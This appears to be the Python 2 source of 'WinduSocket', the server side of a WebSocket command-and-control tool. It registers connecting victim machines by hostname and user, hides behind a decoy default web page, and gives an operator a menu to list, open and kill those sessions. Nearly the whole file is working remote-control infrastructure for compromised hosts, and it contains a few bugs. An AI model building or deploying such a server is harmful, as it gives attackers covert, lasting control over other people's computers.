from helpers import WinduSocketServer
from helpers import KThread
from pydispatch import dispatcher
from menus import Client
import threading
import os, sys, time, cmd
import argparse
import base64
import gevent
from gevent import pywsgi
from geventwebsocket.handler import WebSocketHandler
from geventwebsocket import WebSocketServer
import geventwebsocket

WinduIntro = '''
       ()
                []
                ||
                ||
               .'`.
               |  |
               |  |
   |           |  |           |
   |           |  |           |
   |           |  |           |
   |       _  /    \  _       |
  |~|____.| |/      \| |.____|~|
  |                            |
  `-`-._                  _.-'-'  
        `-.           _.-'        
          ||\________/|| 

 __      __.__            .___             
/  \    /  \__| ____    __| _/_ __         
\   \/\/   /  |/    \  / __ |  |  \        
 \        /|  |   |  \/ /_/ |  |  /        
  \__/\  / |__|___|  /\____ |____/         
  	   \/          \/      \/ 
'''

class WinduServer:
	#This is the only way I could think of having clients available across classes. Probably not a good practice
	sessions = {}
	def __init__(self, BindIP, port, certfile):
		self.host = BindIP 
		self.port = port
		self.clientName = ""
		self.clientUser = ""
		self.certfile = certfile
		self.threads = {}
		self.threadCount = 0
		self.lock = threading.Lock()

	def startServer(self):
		"""Starts the server"""

		if not self.certfile:
			server = WebSocketServer((self.host, self.port), self.handleClient)
		else:
			server = WebSocketServer((self.host, self.port), self.handleClient, self.certfile)

		server.serve_forever()

	def default_response():
		page = "<html><body><h1>It works!</h1>"
		page += "<p>This is the default web page for this server.</p>"
		page += "<p>The web server software is running but no content has been added, yet.</p>"
		page += "</body></html>"
		return page

	def handleHTTP(self, environ, start_response):
		start_response("200 OK", [("Content-Type", "text/html")])
		return [self.default_response()]

	def handleClient(self, environ, start_response):
		
		if environ["PATH_INFO"] == "/connect":
			if environ["wsgi.websocket"] != None:
				
				ws = environ["wsgi.websocket"]
				addr = environ["REMOTE_ADDR"]
				clientMsg = ws.receive()
				#client will always send the hostname, current user with the first message
				clientName, clientUser = clientMsg.encode('ascii').split('|')
				self.clientName = clientName
				self.clientUser = clientUser
				sessionName = "%s@%s" % (self.clientUser, self.clientName)
				dispatcher.send('\nnew client %s connected' % (sessionName), sender="WinduServer")
				with self.lock:
					WinduServer.sessions[sessionName] = {"socket":ws, "name":clientName, "user":clientUser}
				# Need the while loop to keep the connection open
				while True:
					time.sleep(1)
					pass
				#Not sure about what to return to the application
				return environ
			else:
				return self.handleHTTP(environ, start_response)

		else:
			return self.handleHTTP(environ, start_response)
		

	def run(self):
		"""Start the thread for the server"""
		self.threads["Windu"] = KThread.KThread(target=self.startServer)
		try:
			self.threads["Windu"].start()
		except Exception as e:
			print "Unable to start WinduServer: %s" % (e)

	def stop(self):
		"""Kill the server thread"""
		self.threads["Windu"].kill()
		print "Stopped Server"

class Menu(cmd.Cmd, WinduServer):
	"""MainMenu Cmd loop"""

	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = "--=oWSo=--> "
		self.intro = WinduIntro
		self.do_help.__func__.__doc__ = '''Displays the help menu.'''
		self.menu_state = "main"
		dispatcher.connect(self.handle_event, sender=dispatcher.Any)

	def handle_event(self, signal, sender):
		'''Handle new clients connecting'''
		print "%s" % (signal)

	def default(self, line):
		"""Default processing"""
		#print "Please see help for available commands"
		pass

	def do_open(self, line):
		"""Open a websocket client session"""
		
		sessionName = line.strip()
		if sessionName in WinduServer.sessions:
			ws = WinduServer.sessions[sessionName]['socket']
			clientName = WinduServer.sessions[sessionName]['name']
			clientUser = WinduServer.sessions[sessionName]['user']
			clientMenu = Client.WinduClientMenu(ws, clientName, clientUser, self)
			clientMenu.cmdloop()
		else:
			print "Invalid session name"

	def do_list(self, line):
		"""list connected clients"""
		
		currSessions = ""
		for session in WinduServer.sessions.keys():
			currSessions += session + '\r'

		print currSessions
		

	def do_close(self, line):
		"""Close/kill a websocket client session"""
		
		sessionName = line.strip()
		if sessionName in WinduServer.sessions:
			sessions[sessionName]['socket'].close()
			del sessions[sessionName]
			print "Killed %s" % (sessionName)
		else:
			print "Invalid session name"

	def do_exit(self, line):
		'''Exit WinduSocket'''
		raise KeyboardInterrupt

	def emptyline(self):
		pass

	def cmdloop(self):
		'''cmdloop logic'''
		while True:
			try:
				cmd.Cmd.cmdloop(self)
			except KeyboardInterrupt:
				try:
					background = raw_input("Exit (Y/N)?")
					if background.lower() == 'y':
						return True
					elif background.lower() == 'n':
						continue
				except KeyboardInterrupt as e:
					raise e

	def complete_open(self, text, line, begidx, endidx):
		'''open tab completion'''

		mline = line.partition(' ')[2]
		offs = len(mline) - len(text)
		return [s[offs:] for s in WinduServer.sessions.keys() if s.startswith(mline)]

	def complete_close(self, text, line, begidx, endidx):
		'''close tab completion'''
		
		mline = line.partition(' ')[2]
		offs = len(mline) - len(text)
		return [s[offs:] for s in WinduServer.sessions.keys() if s.startswith(mline)]